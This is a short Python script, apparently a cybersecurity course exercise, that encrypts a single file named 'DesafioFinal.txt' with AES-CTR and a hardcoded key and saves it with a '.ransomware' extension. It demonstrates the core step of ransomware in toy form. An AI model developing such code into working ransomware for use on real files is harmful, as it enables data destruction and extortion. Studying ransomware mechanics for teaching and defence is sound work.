import os
import pyaes

# Nome do arquivo a ser criptografado
file_name = "DesafioFinal.txt"
# Nome do arquivo criptografado
encrypted_file_name = f"{file_name}.ransomware"

# Dados do arquivo
with open(file_name, "rb") as file:
    file_data = file.read()

# Chave de criptografia (16 bytes para AES-128)
key = b'cybersecurity123'  # Certifique-se de usar 16, 24 ou 32 bytes

# Criar um objeto AES para criptografia
aes = pyaes.AESModeOfOperationCTR(key)
encrypted_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
with open(encrypted_file_name, "wb") as encrypted_file:
    encrypted_file.write(encrypted_data)

print(f"Arquivo '{file_name}' criptografado com sucesso para '{encrypted_file_name}'")
